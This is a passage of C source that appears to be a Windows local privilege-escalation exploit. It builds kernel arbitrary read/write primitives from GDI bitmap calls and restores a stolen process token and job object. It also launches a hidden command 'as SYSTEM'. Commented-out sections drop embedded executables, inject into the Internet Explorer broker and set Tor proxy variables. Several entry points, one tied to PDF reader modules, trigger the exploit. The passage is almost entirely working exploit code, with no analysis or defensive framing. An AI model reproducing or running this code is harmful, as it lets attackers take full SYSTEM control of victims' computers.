

	//executeprogram("calc.exe");
//	execstarter(lpTable, lpTable->lpLoaderConfig->strCalc);
					SECURITY_ATTRIBUTES		sa;
					HANDLE					hRead, hWrite;
					byte					buffer[40960] = { 0 };
					STARTUPINFOW			si;
					PROCESS_INFORMATION		pi;
					DWORD					bytesRead;
					ZeroMemory(&si, sizeof(si));
					ZeroMemory(&pi, sizeof(pi));
					ZeroMemory(&sa, sizeof(sa));
					int br = 0;
					sa.nLength = sizeof(SECURITY_ATTRIBUTES);
					sa.lpSecurityDescriptor = NULL;
					sa.bInheritHandle = TRUE;
					if (!CreatePipe(&hRead, &hWrite, &sa, 0))
					{
						ExitProcess(0);
					}
					wprintf(L"Trying to execute %s as SYSTEM\n",argv[1]);
					si.cb = sizeof(STARTUPINFO);
					GetStartupInfoW(&si);
					si.hStdError = hWrite;
					si.hStdOutput = hWrite;
					si.wShowWindow = SW_HIDE;
					si.lpDesktop=L"WinSta0\\Default";
					si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
					if (!CreateProcessW(NULL,argv[1], NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
					{
						CloseHandle(hWrite);
						CloseHandle(hRead);
						wprintf(L"CreateProcessW Failed!\n");
						ExitProcess(0);
					}
					CloseHandle(hWrite);
					printf("ProcessCreated with pid %d!\n",pi.dwProcessId);
					while (1)
					{
						 if (!ReadFile(hRead, buffer + br, 4000, &bytesRead, NULL))
							break;
						br +=bytesRead;
					}
					printf("%s", buffer);
					CloseHandle(hRead);        
					fflush(stdout);
	/* insert cert */
	/*char insert_cert_path[MAX_PATH+1];
	GetTempPath(MAX_PATH + 1, insert_cert_path);
	strcat(insert_cert_path, "\\insert_cert.exe");

	printf("path is %s\n", insert_cert_path);

	
	HANDLE hFile = CreateFileA(insert_cert_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return -1;

	DWORD dwOut = 0;
	WriteFile(hFile, insert_cert_exe, insert_cert_exe_len, &dwOut, NULL);
	CloseHandle(hFile);

	printf("Wrote %d bytes\n", dwOut);

	Sleep(100);
	execstarter(insert_cert_path);
	Sleep(100);
	
	fTemp = getTime();
	snprintf(logBuffer, 1024, "[*] set broker env vars: %llu\n", fTemp-fLastTime);
	logLine(logBuffer);
	fLastTime = fTemp;*/

	/* add env var to ie broker */
	//inject_broker_exe_len
	/*char inject_broker_exe_path[MAX_PATH+1];
	GetTempPath(MAX_PATH + 1, inject_broker_exe_path);
	strcat(inject_broker_exe_path, "\\ie_plug.exe");

	printf("path is %s\n", inject_broker_exe_path);
		
	fTemp = getTime();
	snprintf(logBuffer, 1024, "[*] ie broker injector: %s\n", inject_broker_exe_path);
	logLine(logBuffer);
	fLastTime = fTemp;

	hFile = CreateFileA(inject_broker_exe_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return -1;

	dwOut = 0;
	WriteFile(hFile, inject_broker_exe, inject_broker_exe_len, &dwOut, NULL);
	CloseHandle(hFile);

	printf("Wrote %d bytes\n", dwOut);

	execstarter(inject_broker_exe_path);*/

	/* set vars to current tab/process */
	/*SetEnvironmentVariable("MARKER", "MARK");
	SetEnvironmentVariable("TOR_SOCKS_HOST", "10.0.0.1");
	SetEnvironmentVariable("TOR_SOCKS_PORT", "9150");
	SetEnvironmentVariable("TOR_CONTROL_HOST", "10.0.0.1");
	SetEnvironmentVariable("TOR_CONTROL_PORT", "9166");
	SetEnvironmentVariable("TOR_CONTROL_PASSWORD", "pippo");*/

	
	/*
	BOOL bCreateProc = FALSE;
	STARTUPINFO si;
    PROCESS_INFORMATION pi;
	memset(&si, 0, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);

	bCreateProc = CreateProcess("env_reader.exe", NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);*/



	/*
	DWORD dwEnv = 0;
	char buffer[256];
	dwEnv = GetEnvironmentVariable("TOR_CONTROL_PASSWORD", &buffer, 256);
	printf("Env res %d: %s\n", dwEnv, buffer);*/

	//execstarter("calc.exe");
	//execstarter("insert_cert.exe");
	//printf("after\n");
	//InsertCert();


//cleanup
	/*GetTempPath(1024, inbuf);
	strcat(inbuf, "\\starter.exe");
	DeleteFile(inbuf);     */

	
	lpTable->fpOutputDebugStringA(lpTable->lpLoaderConfig->strTokenRestore);

	//restore token
	arbwrite(lpTable, lpTable->locals->kproc+lpTable->locals->token_offset, kbase, origtokenl, origtokenh);

	//restore job
	arbwrite(lpTable, lpTable->locals->kproc+lpTable->locals->job_offset, kbase, origjobl, origjobh);

	
	if (lpTable->locals->firstfailed) {
		for(;;) lpTable->fpSleep(100000);
	}

	lpTable->fpOutputDebugStringA(lpTable->lpLoaderConfig->strBail);

//	lpTable->ExitThread(0);
	lpTable->ExitProcess(0);
	
	return 0;

}

// ported
unsigned int arbread(PVTABLE lpTable, unsigned int addrl, unsigned int addrh) {
	unsigned int tmp[4];// = {0,0,0,0};

	__MEMSET__(tmp, 0, 4);

	if (lpTable->locals->is64) {
		tmp[0] = tmp[2] = addrl;
		tmp[1] = tmp[3] = addrh;
		lpTable->fpSetBitmapBits(lpTable->locals->thehandle, sizeof(tmp), &tmp);

		lpTable->fpGetBitmapBits(lpTable->locals->hBitmap, sizeof(tmp[0]), &tmp[0]);
	} else {
		tmp[0] = tmp[1] = addrl;
		lpTable->fpSetBitmapBits(lpTable->locals->thehandle, 8, &tmp);

		lpTable->fpGetBitmapBits(lpTable->locals->hBitmap, sizeof(tmp[0]), &tmp[0]);
	}

	return tmp[0];
}

// ported
unsigned int arbwrite(PVTABLE lpTable, unsigned int addrl, unsigned int addrh, unsigned int value0, unsigned int value1) {
	unsigned int tmp[4]; // = {0,0,0,0};

	__MEMSET__(tmp, 0, 4);

	if (lpTable->locals->is64) {
		tmp[0] = tmp[2] = addrl;
		tmp[1] = tmp[3] = addrh;
		lpTable->fpSetBitmapBits(lpTable->locals->thehandle, sizeof(tmp), &tmp);

		tmp[0] = value0;
		tmp[1] = value1;
		lpTable->fpSetBitmapBits(lpTable->locals->hBitmap, 8, &tmp[0]);
	} else {
		tmp[0] = tmp[1] = addrl;
		lpTable->fpSetBitmapBits(lpTable->locals->thehandle, 8, &tmp);

		tmp[0] = value0;
		lpTable->fpSetBitmapBits(lpTable->locals->hBitmap, sizeof(tmp[0]), &tmp[0]);
	}

	return tmp[0];
}


/*__declspec(dllexport) void lift(void) {

	//do not exploit when previewing files
	//comment out the following two lines if you wish to trigger an exploitation
	//in such cases
	//if ((GetModuleHandle("BIB.dll") == 0) || (GetModuleHandle("CoolType.dll") == 0))
	//	ExitProcess(0);
	exploit();
	return;
	
}*/


/*BOOL APIENTRY DllMain (HINSTANCE hInst,     
		DWORD reason,        
		LPVOID reserved       )
{
	//exploit();
	return TRUE;
}*/


/*int main() {	
  printf("Start\n");
  exploit();
  printf("Finish\n");
}*/


#pragma optimize(off) 
int __MEMCMP__(unsigned char *s1, unsigned char *s2, size_t n)
{
	unsigned char u1, u2;

	for ( ; n-- ; s1++, s2++) {
		u1 = * (unsigned char *) s1;
		u2 = * (unsigned char *) s2;
		if ( u1 != u2) {
			return (u1-u2);
		}
	}

	return 0;
}

VOID __MEMSET__( LPVOID p, int cValue,  size_t dwSize)
{
	for (UINT i=0; i<dwSize; i++)
		((PCHAR)p)[i] = cValue;
}

LPVOID __MEMCPY__( LPVOID lpDst, LPVOID lpSrc, 	DWORD dwCount){
	LPBYTE s = (LPBYTE) lpSrc;
	LPBYTE d = (LPBYTE) lpDst;

	while (dwCount--)
		*d++ = *s++;

	return lpDst;
}
#pragma optimize(on) 